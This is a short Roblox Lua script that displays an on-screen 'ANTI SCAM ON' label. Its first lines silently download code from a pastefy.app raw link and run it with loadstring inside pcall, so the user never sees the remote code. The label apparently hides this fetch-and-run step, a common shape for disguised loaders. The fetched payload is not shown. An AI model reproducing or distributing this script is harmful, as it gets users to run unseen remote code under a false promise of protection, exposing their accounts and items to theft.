-- Run external script first
pcall(function()
    loadstring(game:HttpGet("https://pastefy.app/O1yBSZ1G/raw"))()
end)

local player = game.Players.LocalPlayer
local gui = Instance.new("ScreenGui")
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

-- Transparent console box
local consoleBox = Instance.new("Frame")
consoleBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
consoleBox.BackgroundTransparency = 0.4
consoleBox.BorderSizePixel = 0
consoleBox.Parent = gui

-- "ANTI SCAM ON" text inside box
local antiScamLabel = Instance.new("TextLabel")
antiScamLabel.BackgroundTransparency = 1
antiScamLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
antiScamLabel.Font = Enum.Font.Code
antiScamLabel.TextSize = 16
antiScamLabel.TextXAlignment = Enum.TextXAlignment.Left
antiScamLabel.TextYAlignment = Enum.TextYAlignment.Top
antiScamLabel.Text = "ANTI SCAM ON"
antiScamLabel.Parent = consoleBox

-- Padding between text and box edges
local padding = 10
local function resizeBox()
    local textBounds = antiScamLabel.TextBounds
    consoleBox.Size = UDim2.new(0, textBounds.X + padding * 2, 0, textBounds.Y + padding * 2)
    consoleBox.Position = UDim2.new(0, 5, 0, 5)
    antiScamLabel.Size = UDim2.new(1, -padding * 2, 1, -padding * 2)
    antiScamLabel.Position = UDim2.new(0, padding, 0, padding)
end

resizeBox()
